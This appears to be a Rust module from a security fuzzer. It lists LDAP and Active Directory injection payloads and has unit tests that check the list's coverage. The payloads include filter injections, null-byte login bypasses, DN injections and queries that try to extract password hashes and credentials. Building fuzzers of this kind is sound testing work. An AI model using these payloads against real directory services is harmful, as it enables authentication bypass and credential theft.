use crate::fuzzer::payloads::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    vec![
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "*".to_string(),
            description: "LDAP wildcard injection".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "admin)\x00".to_string(),
            description: "LDAP null byte injection".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "null-byte".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "admin)(uid=*))(|(uid=*".to_string(),
            description: "LDAP OR injection".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "or-injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "*(objectClass=*)".to_string(),
            description: "LDAP objectClass bypass".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "bypass".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "admin)(objectClass=*".to_string(),
            description: "LDAP objectClass injection".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: ")(cn=*))(|(cn=*".to_string(),
            description: "LDAP filter injection".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "filter".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "*()".to_string(),
            description: "LDAP empty filter test".to_string(),
            severity: Severity::Medium,
            tags: vec!["ldap".to_string(), "test".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "admin\x00".to_string(),
            description: "LDAP null character bypass".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "bypass".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "admin\\28".to_string(),
            description: "LDAP escaped parenthesis".to_string(),
            severity: Severity::Medium,
            tags: vec!["ldap".to_string(), "encoding".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "admin)(&(password=*)".to_string(),
            description: "LDAP AND injection".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "and-injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "))(objectClass=*".to_string(),
            description: "LDAP double parenthesis bypass".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "bypass".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "admin".to_string(),
            description: "LDAP basic username test".to_string(),
            severity: Severity::Low,
            tags: vec!["ldap".to_string(), "basic".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "*)(objectClass=*".to_string(),
            description: "LDAP asterisk injection".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "admin)(|(userPassword=*)".to_string(),
            description: "LDAP password extraction attempt".to_string(),
            severity: Severity::Critical,
            tags: vec!["ldap".to_string(), "password".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: ")(cn=*".to_string(),
            description: "LDAP cn field injection".to_string(),
            severity: Severity::Medium,
            tags: vec!["ldap".to_string(), "injection".to_string()],
        },
        // Active Directory payloads
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "(memberOf=CN=Administrators,CN=Builtin,DC=domain,DC=com)".to_string(),
            description: "AD admin group membership filter".to_string(),
            severity: Severity::Critical,
            tags: vec!["ldap".to_string(), "active-directory".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "(adminCount=1)".to_string(),
            description: "AD admin count attribute filter".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "active-directory".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "(servicePrincipalName=*)".to_string(),
            description: "AD SPN enumeration filter".to_string(),
            severity: Severity::Medium,
            tags: vec!["ldap".to_string(), "active-directory".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=512))"
                .to_string(),
            description: "AD normal user account filter".to_string(),
            severity: Severity::Medium,
            tags: vec!["ldap".to_string(), "active-directory".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "(msDS-KeyCredentialLink=*)".to_string(),
            description: "AD key credential link filter".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "active-directory".to_string()],
        },
        // Search scope payloads
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "(objectClass=*)".to_string(),
            description: "LDAP all objects search scope".to_string(),
            severity: Severity::Medium,
            tags: vec!["ldap".to_string(), "search-scope".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "(&(objectClass=user)(!(objectClass=computer)))".to_string(),
            description: "LDAP users-only filter".to_string(),
            severity: Severity::Medium,
            tags: vec!["ldap".to_string(), "search-scope".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "(&(objectClass=computer)(operatingSystem=*Server*))".to_string(),
            description: "LDAP server computer filter".to_string(),
            severity: Severity::Medium,
            tags: vec!["ldap".to_string(), "search-scope".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "(&(objectClass=group)(cn=*))".to_string(),
            description: "LDAP all groups filter".to_string(),
            severity: Severity::Medium,
            tags: vec!["ldap".to_string(), "search-scope".to_string()],
        },
        // DN injection payloads
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "admin,DC=domain,DC=com".to_string(),
            description: "LDAP DN injection".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "dn-injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "cn=admin,ou=users,dc=domain,dc=com".to_string(),
            description: "LDAP full DN injection".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "dn-injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "*".to_string(),
            description: "LDAP wildcard DN injection".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "dn-injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "\\2a".to_string(),
            description: "LDAP escaped wildcard DN injection".to_string(),
            severity: Severity::High,
            tags: vec!["ldap".to_string(), "dn-injection".to_string()],
        },
        // Attribute extraction payloads
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "(userPassword=*)".to_string(),
            description: "LDAP password attribute extraction".to_string(),
            severity: Severity::Critical,
            tags: vec!["ldap".to_string(), "attribute-extraction".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "(unicodePwd=*)".to_string(),
            description: "AD unicodePwd attribute extraction".to_string(),
            severity: Severity::Critical,
            tags: vec!["ldap".to_string(), "attribute-extraction".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "(ntPwdHistory=*)".to_string(),
            description: "AD NT password history extraction".to_string(),
            severity: Severity::Critical,
            tags: vec!["ldap".to_string(), "attribute-extraction".to_string()],
        },
        Payload {
            payload_type: PayloadType::Ldap,
            payload: "(supplementalCredentials=*)".to_string(),
            description: "AD supplemental credentials extraction".to_string(),
            severity: Severity::Critical,
            tags: vec!["ldap".to_string(), "attribute-extraction".to_string()],
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "LDAP payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_ldap_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Ldap);
        }
    }

    #[test]
    fn contains_wildcard_injection() {
        let payloads = get_payloads();
        let has_wildcard = payloads
            .iter()
            .any(|p| p.payload == "*" || p.payload.contains("*)"));
        assert!(has_wildcard, "Must contain wildcard (*) LDAP injection");
    }

    #[test]
    fn contains_or_filter_injection() {
        let payloads = get_payloads();
        let has_or = payloads.iter().any(|p| p.payload.contains("(|("));
        assert!(has_or, "Must contain LDAP OR filter injection (|()");
    }

    #[test]
    fn contains_and_filter_injection() {
        let payloads = get_payloads();
        let has_and = payloads.iter().any(|p| p.payload.contains("(&("));
        assert!(has_and, "Must contain LDAP AND filter injection (&()");
    }

    #[test]
    fn contains_objectclass_enumeration() {
        let payloads = get_payloads();
        let has_oc = payloads.iter().any(|p| p.payload.contains("objectClass"));
        assert!(has_oc, "Must contain objectClass enumeration payloads");
    }

    #[test]
    fn contains_null_byte_bypass() {
        let payloads = get_payloads();
        let has_null = payloads.iter().any(|p| p.payload.contains('\x00'));
        assert!(has_null, "Must contain null byte bypass payloads");
    }

    #[test]
    fn contains_password_extraction() {
        let payloads = get_payloads();
        let has_pw = payloads
            .iter()
            .any(|p| p.payload.contains("userPassword") || p.payload.contains("password"));
        assert!(has_pw, "Must contain password extraction payloads");
    }

    #[test]
    fn password_extraction_is_critical() {
        let payloads = get_payloads();
        let pw: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"password".to_string()))
            .collect();
        assert!(!pw.is_empty(), "Must have password extraction payloads");
        for p in pw {
            assert_eq!(
                p.severity,
                Severity::Critical,
                "Password extraction must be Critical"
            );
        }
    }

    #[test]
    fn contains_parenthesis_injection() {
        let payloads = get_payloads();
        let has_paren = payloads
            .iter()
            .any(|p| p.payload.contains(")(") || p.payload.contains("))"));
        assert!(
            has_paren,
            "Must contain parenthesis-based LDAP filter injection"
        );
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 22,
            "Must have LDAP injection payload coverage, got {}",
            payloads.len()
        );
    }
}
